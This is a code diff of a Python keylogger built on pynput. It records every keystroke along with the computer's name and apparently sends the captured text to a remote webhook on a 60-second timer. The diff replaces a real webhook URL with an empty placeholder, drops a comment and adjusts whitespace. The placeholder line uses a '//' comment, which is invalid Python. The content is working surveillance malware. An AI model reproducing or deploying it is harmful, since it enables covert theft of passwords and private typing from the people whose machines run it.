@@ -1,13 +1,12 @@
 from pynput import keyboard
 import requests
 import os
-
 import json
 import threading
 
 text = ""
 time_interval = 60
-webhook_url = 'https://api.reliablewebhook.com/h/27iibas5ckmikdjq'
+webhook_url = ''   // add the webhook url 
 osname = os.name
 pc = os.getenv('COMPUTERNAME')
 
@@ -40,12 +39,9 @@ def on_press(key):
     elif key == keyboard.Key.esc:
         return False
     else:
-        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
         text += str(key).strip("'")
 
 
-
-with keyboard.Listener(on_press=on_press) as listener:
-     
+with keyboard.Listener(on_press=on_press) as listener:     
     send_post_req()
     listener.join()
